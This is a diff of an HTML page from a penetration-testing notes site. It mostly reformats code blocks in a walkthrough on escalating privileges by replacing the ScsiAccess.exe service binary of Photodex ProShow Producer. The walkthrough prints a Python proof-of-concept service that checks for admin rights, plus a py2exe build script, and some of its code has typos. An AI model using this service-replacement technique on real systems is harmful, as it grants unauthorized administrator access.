@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17101,175 +17124,316 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>3.</strong> Restart the windows VM and login as nonadmin user.</p>
 <p><strong>4.</strong> Open the PhotoDex application and in Task Manager locate the service that gets created by the application. It's called ScsiAccess.ç</p>
 <p><strong>5.</strong> Open properties of ScsiAccess service and locate the path to executable. It should be something like:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>C:\Program Files\Photodex\ProShow PRoducer\ScsiAccess.exe
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>C:\Program Files\Photodex\ProShow PRoducer\ScsiAccess.exe
+</span></code></pre></div></td></tr></table></div>
 <p><strong>6.</strong> We can replace that file with a malicious service file that will be triggered when opening the Photodex application and get us escalated to admin privileges.</p>
 <p><strong>7.</strong> Script for windows 7 app. Go to step 8 for windows 10. Jump to step 9 after this step.</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Windows 7</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">servicemanager</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="kn">import</span> <span class="nn">win32serviceutil</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="kn">import</span> <span class="nn">win32service</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="kn">import</span> <span class="nn">win32api</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="kn">import</span> <span class="nn">os</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="kn">import</span> <span class="nn">ctypes</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="k">class</span> <span class="nc">Service</span><span class="p">(</span><span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="p">):</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    <span class="n">_svc_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>    <span class="n">_svc_display_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>        <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>    <span class="k">def</span> <span class="nf">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>        <span class="n">win32api</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">sec</span><span class="o">*</span><span class="mi">1000</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>    <span class="k">def</span> <span class="nf">SvcDoRun</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">)</span>
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>        <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_RUNNING</span><span class="p">)</span>
-</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>
-</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>        <span class="k">except</span><span class="p">:</span>
-</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">SvcStop</span><span class="p">()</span>
-</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>    <span class="k">def</span> <span class="nf">SvcStop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">)</span>
-</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOPPEED</span><span class="p">)</span>
-</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>
-</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">True</span>
-</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>
-</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;C:/Users/nonadmin/Desktop/priv.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
-</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>        <span class="k">if</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">shell32</span><span class="o">.</span><span class="n">IsUserAnAdmin</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;[-] We are NOT admin&#39;</span><span class="p">)</span>
-</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>        <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;[+] We are admin&#39;</span><span class="p">)</span>
-</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>
-</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">False</span>
-</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>
-</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>
-</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>
-</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">Initialize</span><span class="p">()</span>
-</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">PrepareToHostSingle</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
-</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">StartServiceCtrlDispatcher</span><span class="p">()</span>
-</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>    <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">HandleCommandLine</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span>
+<span class="normal"><a href="#__codelineno-1-25">25</a></span>
+<span class="normal"><a href="#__codelineno-1-26">26</a></span>
+<span class="normal"><a href="#__codelineno-1-27">27</a></span>
+<span class="normal"><a href="#__codelineno-1-28">28</a></span>
+<span class="normal"><a href="#__codelineno-1-29">29</a></span>
+<span class="normal"><a href="#__codelineno-1-30">30</a></span>
+<span class="normal"><a href="#__codelineno-1-31">31</a></span>
+<span class="normal"><a href="#__codelineno-1-32">32</a></span>
+<span class="normal"><a href="#__codelineno-1-33">33</a></span>
+<span class="normal"><a href="#__codelineno-1-34">34</a></span>
+<span class="normal"><a href="#__codelineno-1-35">35</a></span>
+<span class="normal"><a href="#__codelineno-1-36">36</a></span>
+<span class="normal"><a href="#__codelineno-1-37">37</a></span>
+<span class="normal"><a href="#__codelineno-1-38">38</a></span>
+<span class="normal"><a href="#__codelineno-1-39">39</a></span>
+<span class="normal"><a href="#__codelineno-1-40">40</a></span>
+<span class="normal"><a href="#__codelineno-1-41">41</a></span>
+<span class="normal"><a href="#__codelineno-1-42">42</a></span>
+<span class="normal"><a href="#__codelineno-1-43">43</a></span>
+<span class="normal"><a href="#__codelineno-1-44">44</a></span>
+<span class="normal"><a href="#__codelineno-1-45">45</a></span>
+<span class="normal"><a href="#__codelineno-1-46">46</a></span>
+<span class="normal"><a href="#__codelineno-1-47">47</a></span>
+<span class="normal"><a href="#__codelineno-1-48">48</a></span>
+<span class="normal"><a href="#__codelineno-1-49">49</a></span>
+<span class="normal"><a href="#__codelineno-1-50">50</a></span>
+<span class="normal"><a href="#__codelineno-1-51">51</a></span>
+<span class="normal"><a href="#__codelineno-1-52">52</a></span>
+<span class="normal"><a href="#__codelineno-1-53">53</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># Windows 7</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">servicemanager</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kn">import</span> <span class="nn">win32serviceutil</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="kn">import</span> <span class="nn">win32service</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="kn">import</span> <span class="nn">win32api</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="kn">import</span> <span class="nn">os</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="kn">import</span> <span class="nn">ctypes</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="k">class</span> <span class="nc">Service</span><span class="p">(</span><span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="p">):</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>    <span class="n">_svc_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>    <span class="n">_svc_display_name_</span> <span class="o">=</span> <span class="s1">&#39;ScsiAccess&#39;</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a>        <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">ServiceFramework</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a>    <span class="k">def</span> <span class="nf">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>        <span class="n">win32api</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">sec</span><span class="o">*</span><span class="mi">1000</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>    <span class="k">def</span> <span class="nf">SvcDoRun</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_START_PENDING</span><span class="p">)</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_RUNNING</span><span class="p">)</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a>        <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">SvcStop</span><span class="p">()</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a>    <span class="k">def</span> <span class="nf">SvcStop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOP_PENDING</span><span class="p">)</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">ReportServiceStatus</span><span class="p">(</span><span class="n">win32service</span><span class="o">.</span><span class="n">SERVICE_STOPPEED</span><span class="p">)</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">True</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a>        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;C:/Users/nonadmin/Desktop/priv.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38"></a>        <span class="k">if</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">shell32</span><span class="o">.</span><span class="n">IsUserAnAdmin</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;[-] We are NOT admin&#39;</span><span class="p">)</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a>        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;[+] We are admin&#39;</span><span class="p">)</span>
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42"></a>        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43"></a>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44"></a>    <span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">runflag</span><span class="o">=</span><span class="kc">False</span>
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46"></a>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48"></a>
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49"></a>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">Initialize</span><span class="p">()</span>
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">PrepareToHostSingle</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52"></a>    <span class="n">servicemanager</span><span class="o">.</span><span class="n">StartServiceCtrlDispatcher</span><span class="p">()</span>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53"></a>    <span class="n">win32serviceutil</span><span class="o">.</span><span class="n">HandleCommandLine</span><span class="p">(</span><span class="n">Service</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <p>We can use py2exe to craft an exe file for that python script:</p>
 <p>This setup file will convert the python script scsiaccess.py into an exe file:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">from</span> <span class="nn">distutils.core</span> <span class="kn">import</span> <span class="n">setup</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">import</span> <span class="nn">py2exe</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">sys</span><span class="o">.</span><span class="n">arg</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;py2exe&quot;</span><span class="p">)</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">setup</span><span class="p">(</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>      <span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;py2exe&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bundle_files&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">}},</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>      <span class="n">windows</span> <span class="o">=</span> <span class="p">[</span> <span class="p">{</span><span class="s1">&#39;script&#39;</span><span class="p">:</span> <span class="s2">&quot;scsiaccess.py&quot;</span><span class="p">}],</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>      <span class="n">zipfule</span> <span class="o">=</span> <span class="kc">None</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="p">)</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span>
+<span class="normal"><a href="#__codelineno-2-7">7</a></span>
+<span class="normal"><a href="#__codelineno-2-8">8</a></span>
+<span class="normal"><a href="#__codelineno-2-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="kn">from</span> <span class="nn">distutils.core</span> <span class="kn">import</span> <span class="n">setup</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="kn">import</span> <span class="nn">py2exe</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="n">sys</span><span class="o">.</span><span class="n">arg</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;py2exe&quot;</span><span class="p">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="n">setup</span><span class="p">(</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>      <span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;py2exe&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bundle_files&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">}},</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>      <span class="n">windows</span> <span class="o">=</span> <span class="p">[</span> <span class="p">{</span><span class="s1">&#39;script&#39;</span><span class="p">:</span> <span class="s2">&quot;scsiaccess.py&quot;</span><span class="p">}],</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>      <span class="n">zipfule</span> <span class="o">=</span> <span class="kc">None</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <p>You can also use <a href="../../pyinstaller/">pyinstaller</a>:</p>
